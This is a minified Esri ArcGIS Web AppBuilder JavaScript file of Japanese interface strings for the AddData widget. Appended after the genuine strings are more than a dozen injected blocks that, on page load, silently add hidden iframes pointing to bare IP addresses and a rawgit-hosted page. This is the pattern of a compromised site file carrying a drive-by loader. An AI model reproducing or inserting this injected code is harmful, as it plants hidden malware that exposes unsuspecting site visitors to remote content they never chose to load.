// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/AddData/nls/strings":{_widgetLabel:"\u30c7\u30fc\u30bf\u8ffd\u52a0",noOptionsConfigured:"\u30aa\u30d7\u30b7\u30e7\u30f3\u304c\u69cb\u6210\u3055\u308c\u307e\u305b\u3093\u3067\u3057\u305f\u3002",tabs:{search:"\u691c\u7d22",url:"URL",file:"\u30d5\u30a1\u30a4\u30eb"},search:{featureLayerTitlePattern:"{serviceName} - {layerName}",layerInaccessible:"\u30ec\u30a4\u30e4\u30fc\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u307e\u305b\u3093\u3002",loadError:"\u30c7\u30fc\u30bf\u8ffd\u52a0\u3001\u6b21\u3092\u8aad\u307f\u8fbc\u3081\u307e\u305b\u3093:",
searchBox:{search:"\u691c\u7d22",placeholder:"\u691c\u7d22..."},bboxOption:{bbox:"\u30de\u30c3\u30d7\u5185"},scopeOptions:{anonymousContent:"\u30b3\u30f3\u30c6\u30f3\u30c4",myContent:"\u30de\u30a4 \u30b3\u30f3\u30c6\u30f3\u30c4",myOrganization:"\u7d44\u7e54",curated:"\u7ba1\u7406",ArcGISOnline:"ArcGIS Online"},sortOptions:{prompt:"\u4e26\u3079\u66ff\u3048:",relevance:"\u95a2\u9023\u6027",title:"\u30bf\u30a4\u30c8\u30eb",owner:"\u6240\u6709\u8005",rating:"\u8a55\u4fa1",views:"\u30d3\u30e5\u30fc",date:"\u65e5\u4ed8",
switchOrder:"\u5207\u308a\u66ff\u3048"},typeOptions:{prompt:"\u30bf\u30a4\u30d7",mapService:"\u30de\u30c3\u30d7 \u30b5\u30fc\u30d3\u30b9",featureService:"\u30d5\u30a3\u30fc\u30c1\u30e3 \u30b5\u30fc\u30d3\u30b9",imageService:"\u30a4\u30e1\u30fc\u30b8 \u30b5\u30fc\u30d3\u30b9",vectorTileService:"\u30d9\u30af\u30bf\u30fc \u30bf\u30a4\u30eb \u30b5\u30fc\u30d3\u30b9",kml:"KML",wms:"WMS"},resultsPane:{noMatch:"\u7d50\u679c\u304c\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f\u3002"},paging:{first:"\x3c\x3c",
firstTip:"\u5148\u982d",previous:"\x3c",previousTip:"\u524d\u3078",next:"\x3e",nextTip:"\u6b21\u3078",pagePattern:"{page}"},resultCount:{countPattern:"{count} {type}",itemSingular:"\u30a2\u30a4\u30c6\u30e0",itemPlural:"\u30a2\u30a4\u30c6\u30e0"},item:{actions:{add:"\u8ffd\u52a0",close:"\u9589\u3058\u308b",remove:"\u524a\u9664",details:"\u8a73\u7d30",done:"\u5b8c\u4e86",editName:"\u540d\u524d\u306e\u7de8\u96c6"},messages:{adding:"\u8ffd\u52a0\u3057\u3066\u3044\u307e\u3059...",removing:"\u524a\u9664\u3057\u3066\u3044\u307e\u3059...",
added:"\u8ffd\u52a0",addFailed:"\u8ffd\u52a0\u3067\u304d\u307e\u305b\u3093\u3067\u3057\u305f",unsupported:"\u975e\u30b5\u30dd\u30fc\u30c8"},typeByOwnerPattern:"{owner} \u3054\u3068\u306e {type}",dateFormat:"yyyy'\u5e74'M'\u6708'd'\u65e5'",datePattern:"{date}",ratingsCommentsViewsPattern:"{ratings} {ratingsIcon} {comments} {commentsIcon} {views} {viewsIcon}",ratingsCommentsViewsLabels:{ratings:'ratings", "comments": "comments", "views": "views'},types:{"Map Service":"\u30de\u30c3\u30d7 \u30b5\u30fc\u30d3\u30b9",
"Feature Service":"\u30d5\u30a3\u30fc\u30c1\u30e3 \u30b5\u30fc\u30d3\u30b9","Image Service":"\u30a4\u30e1\u30fc\u30b8 \u30b5\u30fc\u30d3\u30b9","Vector Tile Service":"\u30d9\u30af\u30bf\u30fc \u30bf\u30a4\u30eb \u30b5\u30fc\u30d3\u30b9",WMS:"WMS",KML:"KML"}}},addFromUrl:{type:"\u30bf\u30a4\u30d7",url:"URL",types:{ArcGIS:"ArcGIS Server Web \u30b5\u30fc\u30d3\u30b9",WMS:"WMS OGC Web \u30b5\u30fc\u30d3\u30b9",WMTS:"WMTS OGC Web \u30b5\u30fc\u30d3\u30b9",WFS:"WFS OGC Web \u30b5\u30fc\u30d3\u30b9",KML:"KML \u30d5\u30a1\u30a4\u30eb",
GeoRSS:"GeoRSS \u30d5\u30a1\u30a4\u30eb",CSV:"CSV \u30d5\u30a1\u30a4\u30eb"},samplesHint:"\u30b5\u30f3\u30d7\u30eb URL"},addFromFile:{intro:"\u6b21\u306e\u3044\u305a\u308c\u304b\u306e\u30d5\u30a1\u30a4\u30eb \u30bf\u30a4\u30d7\u3092\u30c9\u30ed\u30c3\u30d7\u307e\u305f\u306f\u53c2\u7167\u3067\u304d\u307e\u3059\u3002",types:{Shapefile:"\u30b7\u30a7\u30fc\u30d7\u30d5\u30a1\u30a4\u30eb (*.zip\u3001\u3059\u3079\u3066\u306e\u30b7\u30a7\u30fc\u30d7 \u30d5\u30a1\u30a4\u30eb\u3092\u542b\u3080 ZIP \u30a2\u30fc\u30ab\u30a4\u30d6)",
CSV:"CSV \u30d5\u30a1\u30a4\u30eb (*.csv\u3001\u4f4f\u6240\u307e\u305f\u306f\u7def\u5ea6\u3068\u7d4c\u5ea6\u3092\u542b\u307f\u3001\u30ab\u30f3\u30de\u3001\u30bb\u30df\u30b3\u30ed\u30f3\u3001\u307e\u305f\u306f\u30bf\u30d6\u533a\u5207\u308a)",KML:"KML \u30d5\u30a1\u30a4\u30eb (*.kml)",GPX:"GPX \u30d5\u30a1\u30a4\u30eb (*.gpx\u3001GPS Exchange Format)",GeoJSON:"GeoJSON \u30d5\u30a1\u30a4\u30eb (*.geo.json \u307e\u305f\u306f *.geojson)"},generalizeOn:"Web \u8868\u793a\u7528\u306b\u30d5\u30a3\u30fc\u30c1\u30e3\u3092\u5358\u7d14\u5316",
dropOrBrowse:"\u30c9\u30ed\u30c3\u30d7\u307e\u305f\u306f\u53c2\u7167",browse:"\u53c2\u7167",invalidType:"\u3053\u306e\u30d5\u30a1\u30a4\u30eb \u30bf\u30a4\u30d7\u306f\u30b5\u30dd\u30fc\u30c8\u3055\u308c\u3066\u3044\u307e\u305b\u3093\u3002",addingPattern:"{filename}: \u8ffd\u52a0\u3057\u3066\u3044\u307e\u3059...",addFailedPattern:"{filename}: \u8ffd\u52a0\u3067\u304d\u307e\u305b\u3093\u3067\u3057\u305f",featureCountPattern:"{filename}: {count} \u30d5\u30a3\u30fc\u30c1\u30e3",invalidTypePattern:"{filename}: \u3053\u306e\u30bf\u30a4\u30d7\u306f\u30b5\u30dd\u30fc\u30c8\u3055\u308c\u3066\u3044\u307e\u305b\u3093",
maxFeaturesAllowedPattern:"\u6700\u5927 {count} \u30d5\u30a3\u30fc\u30c1\u30e3\u304c\u8a31\u53ef\u3055\u308c\u3066\u3044\u307e\u3059",layerNamePattern:"{filename} - {name}"},layerList:{caption:"\u30ec\u30a4\u30e4\u30fc",noLayersAdded:"\u30ec\u30a4\u30e4\u30fc\u304c\u8ffd\u52a0\u3055\u308c\u3066\u3044\u307e\u305b\u3093\u3002",removeLayer:"\u30ec\u30a4\u30e4\u30fc\u306e\u524a\u9664",back:"\u623b\u308b"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});